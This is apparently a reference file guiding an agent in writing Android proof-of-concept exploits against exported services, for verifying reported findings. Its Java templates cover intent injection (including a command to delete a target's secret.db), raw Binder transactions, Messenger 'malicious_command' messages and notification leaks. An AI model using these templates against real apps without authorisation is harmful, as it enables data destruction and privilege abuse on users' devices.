---
name: poc-app-service
description: Service PoC reference covering AIDL exposure, Messenger abuse, Intent injection, bind escalation, and foreground-notification leakage.
---

# Service PoC Reference

Use this reference for exported or otherwise attacker-reachable Android services. Service PoCs usually fit either `direct-trigger` or `binder-caller` shapes.

## Contents

- [Template Wiring](#template-wiring)
- [Construction Matrix](#construction-matrix)
- [Shared Inputs](#shared-inputs)
- [Pattern 1 - Start-Service Trigger](#pattern-1---start-service-trigger)
- [Pattern 2 - Single-Step Bind And Binder Transaction](#pattern-2---single-step-bind-and-binder-transaction)
- [Pattern 3 - Messenger Protocol Caller](#pattern-3---messenger-protocol-caller)
- [Pattern 4 - Foreground-Notification Observation](#pattern-4---foreground-notification-observation)
- [Construction Notes](#construction-notes)

## Template Wiring

These snippets show the exploit body shape. In the current template:

- keep start, bind, or Messenger setup in a helper method
- register one exploit id in `ExploitRegistry`
- prefer one reusable connection or Binder helper over one-off PoC classes
- add interface wrappers only when the compile path truly needs them

## Construction Matrix

| Vulnerability | PoC shape | Typical support | Visible success |
|---------------|--------------|-----------------|-----------------|
| AIDL exposure | `binder-caller` | recreated Stub/interface | sensitive method returns data or accepts privileged action |
| Messenger abuse | `binder-caller` | none | target handler accepts attacker message |
| Intent injection | `direct-trigger` | none | service performs attacker-requested action |
| Bind escalation | `binder-caller` | recreated Binder wrapper if needed | privileged Binder method succeeds |
| Foreground leak | `ui-assisted` | optional notification listener | sensitive notification text is visible or captured |

## Shared Inputs

- victim service class
- exported or bindable status
- required action, component name, extras, or message codes
- Binder descriptor, transact code, or `what`/`arg1`/`obj` protocol
- visible success signal

## Pattern 1 - Start-Service Trigger

Use for `onStartCommand()`-driven abuse.

```java
private static void runServiceIntentInject(Context context) {
    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.CommandService");
    intent.setAction("com.target.EXECUTE_COMMAND");
    intent.putExtra("command", "delete");
    intent.putExtra("target_path", "/data/data/com.target/databases/secret.db");
    context.startService(intent);
    Log.i("PoC", "Sent startService() trigger to com.target.CommandService");
}
```

Registration shape:

```java
static {
    register("service-start", "Start Exported Service", () -> runServiceIntentInject(appContext));
}
```

Use when:

- the service reads attacker-controlled extras or action strings from `onStartCommand()`
- no non-bypassable permission check blocks the launch

## Pattern 2 - Single-Step Bind And Binder Transaction

Use for exported AIDL or Binder exposure.

```java
private static void runServiceBinderTransact(
    Context context,
    String packageName,
    String serviceClass,
    String interfaceDescriptor,
    int transactCode
) {
    Intent intent = new Intent();
    intent.setClassName(packageName, serviceClass);

    ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Parcel input = Parcel.obtain();
            Parcel output = Parcel.obtain();
            try {
                input.writeInterfaceToken(interfaceDescriptor);
                // Write parameters positionally
                // input.writeString("test")
                service.transact(transactCode, input, output, 0);
                Log.i("PoC", "Binder transact finished for code " + transactCode);
            } catch (Exception e) {
                Log.e("PoC", "Binder transact failed", e);
            } finally {
                input.recycle();
                output.recycle();
                context.unbindService(this);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.i("PoC", "Service disconnected: " + name.flattenToShortString());
        }
    };

    boolean bound = context.bindService(intent, connection, Context.BIND_AUTO_CREATE);
    if (!bound) {
        Log.w("PoC", "bindService() returned false for " + serviceClass);
    }
}
```

Registration shape:

```java
static {
    register("service-transact", "Bind And Call Binder Transaction", () -> {
        runServiceBinderTransact(
            appContext,
            "com.target",
            "com.target.VulnService",
            "com.target.IVulnService",
            3
        );
    });
}
```

Fill with:

- real package name and service class, or equivalent explicit bind `Intent`
- real interface descriptor
- real transact code or verified Stub method mapping
- exact positional parameters and reply parsing

Use when:

- the exported service returns a raw Binder to external callers
- the report already identified a reachable privileged transaction
- reconstructing full `.aidl` is unnecessary or more fragile than direct `transact(...)`

If a stable `.aidl` interface already exists and compiles cleanly, using it is still acceptable, but keep the PoC focused on one verified method.

If the finding really needs a `bind -> wait -> multiple calls` flow, split connection setup and repeated calls into separate helpers. Default to the single-step shape above.

## Pattern 3 - Messenger Protocol Caller

Use for Messenger-backed service protocols.

```java
private static final ServiceConnection MESSENGER_CONNECTION = new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder binder) {
        try {
            Messenger messenger = new Messenger(binder);
            Message msg = Message.obtain();
            msg.what = 1;
            msg.obj = "malicious_command";
            messenger.send(msg);
            Log.i("PoC", "Sent attacker message to Messenger service");
        } catch (Exception e) {
            Log.e("PoC", "Messenger send failed", e);
        }
    }

    @Override
    public void onServiceDisconnected(ComponentName name) {}
};

private static void runServiceMessengerAbuse(Context context) {
    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.MsgService");
    context.bindService(intent, MESSENGER_CONNECTION, Context.BIND_AUTO_CREATE);
}
```

Registration shape:

```java
static {
    register("service-messenger", "Send Messenger Command", () -> runServiceMessengerAbuse(appContext));
}
```

Fill with:

- real `what`, `arg1`, `arg2`, `Bundle`, `replyTo`, or `obj` values from the verified finding

Use when:

- the service exposes a `Messenger`
- the real attack surface is the message protocol rather than raw `transact(...)`

## Pattern 4 - Foreground-Notification Observation

Use for notification leakage rather than Binder control.

```java
private static void runForegroundLeak(Context context) {
    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.LeakyForegroundService");
    context.startService(intent);
    Log.i("PoC", "Started foreground service. Check whether the notification exposes sensitive text.");
}
```

Registration shape:

```java
static {
    register("service-foreground", "Start Foreground Service", () -> runForegroundLeak(appContext));
}
```

Use when:

- the finding is about visible notification content rather than Binder control or message protocol abuse

Optional support:

- add a `NotificationListenerService` only if the user wants runtime collection instead of manual confirmation

## Construction Notes

- prefer `direct-trigger` when `startService()` alone proves the bug
- prefer `binder-caller` when the real vulnerable path lives behind `onBind()`
- default to one exploit id that both binds and calls; only split phases when the service contract truly needs it
- prefer one reusable raw Binder helper over generating large AIDL scaffolding for every target
- do not fake privileged Binder calls if the report never identified a reachable method or transaction
- for foreground leaks, the success signal is the visible notification content, not a theoretical background leak
